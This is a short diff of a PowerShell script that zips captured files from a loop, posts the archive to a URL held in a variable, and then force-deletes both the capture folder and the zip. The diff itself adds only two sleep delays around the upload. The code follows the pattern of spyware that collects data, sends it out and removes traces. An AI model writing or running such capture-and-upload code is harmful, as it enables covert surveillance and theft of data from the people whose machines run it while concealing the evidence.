@@ -26,7 +26,9 @@ for ($i = 0; $i -lt $numberOfCaptures; $i++) {
 }
 $zipFilePath = "$env:TEMP\collection.zip"
 [IO.Compression.ZipFile]::CreateFromDirectory($outputDir, $zipFilePath)
+Start-Sleep 20
 $fileContent = Get-Item -Path $zipFilePath
 Invoke-RestMethod -Uri $destinationUrl -Method Post -InFile $fileContent.FullName -ContentType "application/zip"
+Start-Sleep 4
 Get-ChildItem -Path $outputDir | Remove-Item -Recurse -Force
 Remove-Item -Path $zipFilePath -Force
